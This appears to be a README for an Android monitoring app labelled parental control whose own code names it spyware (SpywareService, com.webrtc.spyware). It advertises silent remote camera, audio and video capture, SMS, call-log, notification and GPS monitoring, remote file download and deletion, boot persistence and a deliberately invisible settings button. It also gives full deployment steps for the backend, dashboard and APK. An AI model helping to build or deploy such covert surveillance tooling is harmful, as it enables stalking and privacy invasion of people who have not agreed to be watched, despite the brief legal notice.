# 📱 WebRTC Android ParentControl — v2.0

> **Upgraded Android WebRTC Parental Monitoring App** with Firebase Realtime DB, auto-reconnect, anti-connection-loss logic, dual camera streaming, media capture, remote file explorer, GPS tracking, SMS/call monitoring, notification feed, PHP web dashboard with login, and Node.js signaling backend deployable on Render.

<p align="center">
  <img src="ServerDashboard.png" alt="Dashboard Preview" width="800"/>
</p>

---

## ✨ Features

### 📷 Advanced Camera Streaming

| Feature | Detail |
|---|---|
| 📹 **High-Quality Video** | Streams camera feed at 640×480 resolution |
| 🔄 **Dual Camera Support** | Front and back cameras displayed simultaneously on web dashboard |
| 📱 **Device Requirement** | Modern Android device + Android 9+ (API 28+) |
| ⚙️ **Auto-Fallback** | Seamlessly switches to single camera on older devices |
| ⚡ **Low Latency** | Real-time streaming with minimal delay |

### 🎤 Premium Audio Streaming

- 🎧 **Real-time Transmission** — Live audio feed to web browser
- 🔇 **Silent Background Capture** — Audio recording triggered remotely from dashboard
- 🎙️ **AAC Encoding** @ 128kbps / 44.1kHz for clear quality

### 📂 Remote File Explorer

- 📂 **Full File System Access** — Browse device storage remotely from dashboard
- ⬇️ **Download** — Transfer files from device to PC
- ⚡ **Chunked Transfer** — Optimized 64KB chunking for stable large file downloads
- 🗑️ **Delete** — Remove files remotely
- 🛡️ **Recovery** — Auto-reconnects file system link if connection drops

### 📱 Comprehensive Device Monitoring

- 💬 **Live SMS Streaming** — Real-time message monitoring and display
- 📞 **Call Log Tracking** — Complete call history with timestamps
- 🗺️ **GPS Location Streaming** — Live location tracking with interactive map display
- 🔔 **Notification Monitoring** — Real-time notification feed from all apps
- 🔄 **Auto-Persistence** — Service auto-restarts on boot and app swipe-away

### 🌐 Advanced WebRTC Technology

- 🔐 **Peer-to-Peer Streaming** — Direct device-to-browser connection
- 🛡️ **STUN/TURN Support** — Reliable connection through NAT/firewall traversal
- ⚡ **Ultra-Low Latency** — Optimized for real-time performance
- 🔄 **Auto-Reconnection** — Intelligent connection recovery with infinite retry

### ⚙️ Dynamic Signaling Server Configuration

- ✍️ **Change IP/Port at runtime** from the app's Streaming Settings page — stored in SharedPreferences
- 🧭 **Invisible Settings Button** — Settings button in the top-right corner is intentionally invisible but clickable; tap the top-right area to open Streaming Settings
- 🌐 **No `network_security_config.xml` required** — App allows cleartext globally (debug/dev friendly)

### 💻 Interactive Web Dashboard

- 📊 **Real-time Status Updates** — Live connection and streaming status
- 🎮 **Responsive Interface** — Works seamlessly across all modern browsers
- 🎯 **Centralized Control** — All device streams in one comprehensive dashboard
- 🔐 **Login Protected** — bcrypt-secured admin authentication
- 🗑️ **Auto-delete Media** — Captured media auto-purged after 24 hours

---

## 🏗️ Architecture

```
┌────────────────────────────────────────────────────────────────┐
│                     SYSTEM ARCHITECTURE                        │
└────────────────────────────────────────────────────────────────┘

  📱 Android Device                    🖥️ Admin Browser
  ┌─────────────────┐                 ┌─────────────────┐
  │ SpywareService  │                 │  PHP Dashboard  │
  │ (Foreground)    │                 │  index.php      │
  │                 │                 │  login.php      │
  │ SocketManager   │◄───Socket.IO───►│  (PHP host)     │
  │ MediaCapture    │                 │                 │
  │ Manager         │      ▲          │  Browser JS     │
  │                 │      │          │  ↕ Socket.IO    │
  │ WebRTC          │      │          │  ↕ WebRTC       │
  │ PeerConnection  │      │          └────────┬────────┘
  └─────────────────┘      │                  │
         │                 └──────────────────┘
         │                         ▲
         ▼                         │
  ┌──────────────────────────────────────────────────────┐
  │           Node.js Backend (Render.com)               │
  │           node-backend/server.js                     │
  │                                                      │
  │  • Device registration   • WebRTC SDP relay          │
  │  • Capture commands      • Media base64 relay        │
  │  • Auto-reconnect        • Health check /health      │
  └──────────────────────────────────────────────────────┘
         │
         ▼ (base64 upload via fetch POST)
  ┌──────────────────────────────────────────────────────┐
  │           PHP Dashboard + MySQL                      │
  │  install.php → login.php → index.php                 │
  │  upload_media.php | delete_media.php                 │
  │  MySQL: admins, devices, media_captures              │
  │  Auto-delete media after 24 hours                    │
  └──────────────────────────────────────────────────────┘
```

---

## 🔧 Core Components

| Component | Purpose | Key Features |
|---|---|---|
| 🏠 `SpywareService.kt` | Heart of streaming — foreground service | WebRTC init, multi-stream capture, signaling, `START_STICKY` |
| 📡 `SocketManager.kt` | Socket.IO client wrapper | Auto-reconnect (∞ retry), capture command dispatch, media emit |
| 🎥 `MediaCaptureManager.kt` | Silent media capture | Camera2 image/video, MediaRecorder audio, background thread |
| 🚀 `BootReceiver.kt` | Auto-start logic | Restarts service on device boot via `ACTION_BOOT_COMPLETED` |
| ⚡ `node-backend/server.js` | WebRTC signaling hub | Socket.IO rooms, peer connection facilitation, health endpoint |
| 🐘 `php-dashboard/install.php` | One-click installer | Creates DB, tables, admin user, writes `config.php` |
| 🔐 `php-dashboard/login.php` | Admin authentication | bcrypt password verify, PHP sessions |
| 🎨 `php-dashboard/index.php` | Web dashboard | Live view, media gallery, device controls |
| ⬆️ `php-dashboard/upload_media.php` | Media storage | Base64→file, DB insert, expiry setting |

---

## 📋 Prerequisites

### 📱 Android Development

- 💻 **Android Studio** — Latest version recommended (Arctic Fox+)
- 🛠️ **Android SDK**:
  - Minimum: API 21+ (Android 5.0)
  - Recommended: API 28+ (Android 9.0) for dual camera support
- 📱 **Test Device** — Physical device or emulator with camera and microphone
- 🔄 **Dual Camera Requirements**:
  - Modern Android device with concurrent camera access support
  - Android 9+ (API level 28+)
  - Multiple camera sensors capable of simultaneous streaming

### 🖥️ Server Environment

- 🟢 **Node.js** — Version 18.x or higher
- 📦 **npm** — Version 8.x or higher
- 💾 **Storage** — Minimal requirements (< 100MB)
- 🐘 **PHP Host** — PHP 7.4+, MySQL 5.7+, shared hosting/cPanel OK

### 🌐 Browser Compatibility

| Browser | Min Version |
|---|---|
| ✅ Chrome | 80+ (Recommended) |
| ✅ Firefox | 75+ |
| ✅ Safari | 13+ |
| ✅ Edge | 80+ |

### 🌐 TURN Server Access

- 🔐 **Credentials** — Valid `numb.viagenie.ca` account (or alternative TURN provider)
- 🏠 **Local Network** — Devices on same network for optimal performance
- 🌍 **Remote Access** — TURN server required for cross-network connections

---

## 🚀 Quick Setup

### 1️⃣ Deploy Node.js Backend (Render)

1. Go to [render.com](https://render.com) → **New Web Service**
2. Connect your GitHub repo: `david0154/WebRTC-Android-prentcontrol`
3. Configure:

| Setting | Value |
|---|---|
| Root Directory | `node-backend` |
| Build Command | `npm install` |
| Start Command | `node server.js` |
| Health Check Path | `/health` |

4. Copy your Render URL: `https://YOUR-APP.onrender.com`

### 2️⃣ Setup PHP Dashboard (One-Click)

1. Upload `php-dashboard/` to your PHP host
2. Open `https://your-domain.com/install.php`
3. Fill in DB credentials, admin login, and Render URL
4. Click **Install Now** — tables auto-created
5. ⚠️ **Delete `install.php`** immediately after
6. Visit `login.php` → Dashboard ready

### 3️⃣ Configure Android App

1. Open project in **Android Studio**
2. Edit `app/src/main/java/com/webrtc/spyware/SpywareService.kt`:
```kotlin
private val SERVER_URL = "https://YOUR-APP.onrender.com"  // ← your Render URL
```
3. Configure TURN server in `SpywareService.kt` (optional):
```kotlin
PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
    .setUsername("your-actual-username")   // 🔑 Replace
    .setPassword("your-actual-password")   // 🔑 Replace
    .createIceServer()
```
4. Add all permissions from `AndroidManifest_additions.xml` to your manifest
5. **Build → Generate Signed APK** → install on device
6. Grant all permissions:
   - 📷 Camera | 🎤 Microphone | 📍 Location
   - 💬 SMS | 📞 Phone | 🔔 Notifications
   - 💾 Manage External Storage (Android 11+ for File Explorer)

### 4️⃣ Access Dashboard

```
https://your-domain.com/login.php
```

Login → Device appears in sidebar → All streams available ✅

> 💡 **Pro Tip**: Keep the Android app in the foreground initially to ensure all streams initialize. Once connected, you can minimize the app.

---

## 📦 Feature Status

| Feature | Status |
|---|---|
| WebRTC Live View (Camera) | ✅ |
| Dual Camera Simultaneous Stream | ✅ API 28+ |
| Auto-Fallback Single Camera | ✅ |
| Real-time Audio Stream | ✅ |
| Silent Image Capture (front/back) | ✅ |
| Silent Audio Recording (remote) | ✅ |
| Silent Video Recording (remote) | ✅ |
| Remote File Explorer | ✅ |
| Chunked File Download (64KB) | ✅ |
| Remote File Delete | ✅ |
| Live SMS Monitoring | ✅ |
| Call Log Tracking | ✅ |
| GPS Location + Map | ✅ |
| Notification Feed | ✅ |
| Firebase Realtime DB Sync | ✅ |
| PHP Login Dashboard | ✅ |
| One-click PHP Installer | ✅ |
| Node.js Render Deploy Config | ✅ |
| Auto-delete Media (24h) | ✅ |
| Auto-reconnect (∞ retry) | ✅ |
| Anti-connection-loss (ping/pong) | ✅ |
| Boot auto-start | ✅ |
| Dynamic IP/Port Config (Settings UI) | ✅ |
| Invisible Settings Button | ✅ |
| Cleartext HTTP (no XML needed) | ✅ |

---

## 📂 File Structure

```
WebRTC-Android-prentcontrol/
│
├── 📱 Android App (Kotlin)
│   ├── app/build.gradle.kts
│   └── app/src/main/
│       ├── AndroidManifest.xml
│       ├── AndroidManifest_additions.xml   ← permissions guide
│       └── java/com/webrtc/spyware/
│           ├── SpywareService.kt           ← foreground service (main)
│           ├── SocketManager.kt            ← Socket.IO + auto-reconnect
│           ├── MediaCaptureManager.kt      ← Camera2 + MediaRecorder
│           └── BootReceiver.kt             ← auto-start on boot
│
├── 🟢 Node.js Backend (Render)
│   └── node-backend/
│       ├── server.js                       ← Socket.IO signaling
│       ├── package.json
│       └── render.yaml                     ← Render deploy config
│
├── 🐘 PHP Dashboard (your host)
│   └── php-dashboard/
│       ├── install.php                     ← one-click installer
│       ├── config.php                      ← auto-generated
│       ├── login.php                       ← admin login
│       ├── index.php                       ← dashboard + gallery
│       ├── upload_media.php                ← media storage
│       ├── delete_media.php                ← media removal
│       ├── logout.php
│       ├── .htaccess
│       └── uploads/                        ← media files (auto-created)
│
└── 📦 Legacy Server (backward compat)
    └── Android-WebRTC-Spyware-Server/
        ├── server.js
        ├── package.json
        └── render.yaml
```

---

## 🔧 Debugging & Troubleshooting

### 📱 Android Debugging

```bash
# Monitor streaming service logs
adb logcat | grep SpywareService

# Monitor SocketManager
adb logcat | grep SocketManager

# WebRTC specific
adb logcat | grep MediaCapture
```

**Key Log Indicators:**
- ✅ `Connected to signaling server`
- ✅ `Device registered: [ANDROID_ID]`
- ✅ `Image captured: img_XXXXXXXX.jpg`
- ❌ `Permission denied: camera`
- ❌ `Connection error: [reason]`

### 🖥️ Server Debugging

```bash
# Run with debug logs
DEBUG=socket.io* node server.js

# Check port availability
netstat -tuln | grep 3000

# Kill port if needed
lsof -ti:3000 | xargs kill -9
```

### 🌐 Browser Debugging

```javascript
// Add to browser console for WebRTC stats
pc.getStats().then(stats => {
  stats.forEach(report => {
    if (report.type === 'candidate-pair' && report.state === 'succeeded') {
      console.log('✅ ICE Connection Success:', report);
    }
  });
});
```

### 🚨 Common Issues

| Problem | Symptoms | Solution |
|---|---|---|
| 📷 Camera not streaming | Black screen in dashboard | Check camera permissions, restart app |
| 🎤 No audio | Silent stream | Verify microphone permissions |
| 🌐 Device not appearing | No device card in dashboard | Verify `SERVER_URL` in `SpywareService.kt` matches Render URL |
| 📂 File explorer broken | Connection drops | Auto-reconnects; check INTERNET permission |
| 📍 GPS not updating | No location on map | Grant fine location permission + enable GPS |
| 🔐 Login fails | "Invalid credentials" | Re-run `install.php` or check `admins` table |
| 💾 Media not uploading | Gallery empty after capture | Check `uploads/` folder is writable (chmod 755) |
| 🔋 App killed | Service stops | Whitelist app from battery optimization in device settings |
| 🌙 Render sleeping | Slow first connection | Free tier sleeps; Android auto-reconnects; use UptimeRobot to keep alive |
| 🔐 TURN auth failed | ICE connection fails | Update TURN credentials in `SpywareService.kt` |
| ⚠️ `foregroundServiceType` error | Build fails on API 34+ | Add `FOREGROUND_SERVICE_CAMERA` + `FOREGROUND_SERVICE_MICROPHONE` permissions |

---

## 📷 Camera Support Details

### 📱 Single Camera Mode (Default)

- ✅ **Compatibility** — All supported Android devices (API 21+)
- 🔄 **Functionality** — Streams front or back camera based on selection
- ⚡ **Performance** — Optimized for older devices
- 🔋 **Battery Efficient** — Lower power consumption

### 📹 Dual Camera Mode (Advanced)

**System Requirements:**
- 🔧 Modern Android device with concurrent camera access support
- 📱 Android 9+ (API level 28+)
- 📷 Multiple sensors capable of simultaneous streaming
- 🧠 Sufficient CPU/GPU for dual stream encoding

**Features:**
- 🎥 **Simultaneous Streaming** — Both front and back cameras active at once
- 📊 **Side-by-Side Dashboard** — Dual feeds shown in web interface
- 🔄 **Smart Switching** — Auto quality adjustment based on network
- 📱 **Picture-in-Picture** — Configurable dual stream layout

### 🔍 Device Compatibility Check

```kotlin
// Check concurrent camera support (API 28+)
val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
val ids = cameraManager.cameraIdList
val concurrentSets = cameraManager.concurrentStreamingCameraIds  // API 30+
// If concurrentSets.isNotEmpty() → dual camera supported
```

---

## 🌐 Network Configuration

| Setting | Value |
|---|---|
| Default Server Port | `3000` (configurable in Settings UI) |
| STUN Server | `stun:stun.l.google.com:19302` |
| TURN Server | `turn:numb.viagenie.ca` (optional) |
| Firewall | Ensure port 3000 accessible |
| Bandwidth | Minimum 2 Mbps for smooth streaming |

**TURN Server Alternatives:**
```
stun:stun.l.google.com:19302
stun:stun1.l.google.com:19302
stun:stun2.l.google.com:19302
```

---

## ⚠️ Legal Notice

This tool is intended for **parental control / device monitoring on devices you own or have explicit legal authority to monitor**. Unauthorized surveillance of others is illegal in most jurisdictions. Use responsibly and in full compliance with your local laws.

---

*Built with Node.js · Socket.IO · WebRTC · PHP · MySQL · Kotlin · Camera2 API · MediaRecorder · Firebase*
